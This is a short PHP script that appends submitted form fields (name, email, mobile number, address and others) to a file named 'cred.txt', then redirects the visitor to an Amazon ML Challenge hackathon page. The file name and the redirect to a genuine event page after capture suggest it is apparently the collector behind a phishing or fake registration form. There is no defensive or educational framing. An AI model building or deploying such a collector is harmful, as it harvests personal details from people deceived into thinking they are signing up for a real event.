<?php

$data = 
"------ New Enquiry ------\n" .
"Name: " . $_POST['name'] . "\n" .
"Email: " . $_POST['email'] . "\n" .
"Mobile: " . $_POST['mobile'] . "\n" .
"Qualification: " . $_POST['qualification'] . "\n" .
"City: " . $_POST['city'] . "\n" .
"Source: " . $_POST['source'] . "\n" .
"Address: " . $_POST['address'] . "\n" .
"Notes: " . $_POST['notes'] . "\n" .
"-------------------------\n\n";

file_put_contents("cred.txt", $data, FILE_APPEND);

// Redirect after submit
header("Location: https://unstop.com/hackathons/amazon-ml-challenge-2025-amazon-1560375");
exit();

?>
